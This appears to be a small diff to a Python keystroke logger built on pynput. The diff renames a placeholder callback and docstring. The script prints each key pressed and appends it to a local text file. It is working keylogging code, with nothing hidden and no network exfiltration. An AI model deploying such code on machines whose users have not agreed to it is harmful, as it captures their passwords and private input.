@@ -1,7 +1,7 @@
 from pynput import keyboard
 
-def abc(key):
-    """funkcja ktora robi cos"""
+def keyPressed(key):
+    """writing keys to file"""
     print(str(key))
     with open("keyfile.txt", 'a') as logKey:
         try:
@@ -11,6 +11,6 @@ def abc(key):
             print("error getting char")
 
 if __name__ == "__main__":
-    listener = keyboard.Listener(on_press=abc)
+    listener = keyboard.Listener(on_press=keyPressed)
     listener.start()
     input()
